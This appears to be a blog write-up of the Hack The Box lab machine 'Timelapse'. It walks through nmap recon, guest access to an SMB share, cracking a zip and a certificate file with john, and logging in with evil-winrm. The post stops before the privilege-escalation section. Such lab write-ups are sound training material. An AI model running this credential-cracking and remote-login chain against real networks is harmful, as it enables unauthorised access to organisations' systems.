---
layout: post
title: "HTB: Timelapse"
---

Timelapse, an easy-rated Active Directory machine from Hack The Box, starts by finding a key on an SMB share. After cracking it open and authenticationg via Evil-WinRM, we’ll find credentials in the PowerShell history file for the next user. That useris a member of **LAPS_Readers** group, which allows us to pull out local administrator passwords. With that, we’ll get the administrator password and use Evil-WinRM to get a shell.

# Recon

## nmap

As always, start with nmap scan:
```powershell
sudo nmap -sC -sV -p- -v -oA nmap_scan/nmap_results 10.129.116.41
```
nmap finds 18 open TCP ports:
![nmap](/Content/Writeups/HTB-Timelapse/img/nmap.PNG)

The combination of ports (Kerberos + LDAP + DNS + SMB) suggest this should be a domain controller. Plus there is the name on cert on 5986 (dc01.timelapse.htb).

## SMB - TCP 445

Take a look at SMB, first use `netexec` or `smbclient` and find if null session is allowed.

```powershell
netexec smb 10.129.116.41 --shares -u 'guest' -p ''
```

![SMB](/Content/Writeups/HTB-Timelapse/img/smb1.png)

It is and we have 2 readable shares.
Next use `smbclient` to tak a closer look inside 

```powershell
smbclient -N //10.129.116.41/Shares
```
![SMB2](/Content/Writeups/HTB-Timelapse/img/smb2.png)

There is an interesting file in a **Shares** share, **winrm_backup.zip**. Download it and take a look at it on out machine.

![SMB3](/Content/Writeups/HTB-Timelapse/img/smb3.png)

There were few more files in the **\helpdesk** folder, but there were no use at the end.

# Shell as legacyy

## Exploring winrm_backup.zip

The .zip file we downloaded is password protected. We have to get good old **john** to help there.
Use `zip2john` to get a hash and crack it.

```powershell
zip2john winrm_backup.zip > ziphash.txt
```

![zip_hash](/Content/Writeups/HTB-Timelapse/img/zip_hash.png)

```powershell
john ziphash.txt --wordlist=~/Tools/rockyou.txt
```

![zip_hash2](/Content/Writeups/HTB-Timelapse/img/zip_hash2.png)

And we have out first password! **supremelegacy**

The zip contains single file: **legacyy_dev_auth.pfx**

![unzip](/Content/Writeups/HTB-Timelapse/img/unzip.png)

## Extracting certificate and key from a .pfx file

The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. This topic provides instructions on how to convert the .pfx file to .crt and .key files. [More here](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file).

When we try to extract ... there is a password again, and unfortunatelly not supremelegacy again :)

![pfx1](/Content/Writeups/HTB-Timelapse/img/pfx1.png)

We have to reach for `john` again, this time `pfx2john`

```powershell
pfx2john legacyy_dev_auth.pfx > pfx_hash
```
![pfx2](/Content/Writeups/HTB-Timelapse/img/pfx2.png)

```powershell
john pfx_hash --wordlist=~/Tools/rockyou.txt
```

![pfx3](/Content/Writeups/HTB-Timelapse/img/pfx3.png)

And we get second password **thuglegacy**

With that we can try to extract cert and key again:

```powershell
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx_key.key
```

![key1](/Content/Writeups/HTB-Timelapse/img/key1.png)

It will require you to input PEM pass phrase, you can put whatever you want there (at least 4 chars)

```powershell
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx_cert.crt
```

![key2](/Content/Writeups/HTB-Timelapse/img/key2.png)

## Logging in

We now have everything we need to finally get into the machine.

Use `evil-winrm` and freshly extracted `pfx_key.key` and ` pfx_cert.crt` to get in.

*   `-S` Enable SSL, because its connecting to 5986;
*   `-c` pfx_cert.crt - provide the public key certificate
*   `-k` pfx_key.key - provide the private key
*   `-i` IP - host to connect to

```powershell
evil-winrm -i 10.129.116.41 -k pfx_key.key -c pfx_cert.crt -S
```

![winrm1](/Content/Writeups/HTB-Timelapse/img/winrm1.png)

And we can get our user flag

![user_flag](/Content/Writeups/HTB-Timelapse/img/user_flag.png)

TBC......

# Privilege Escalation

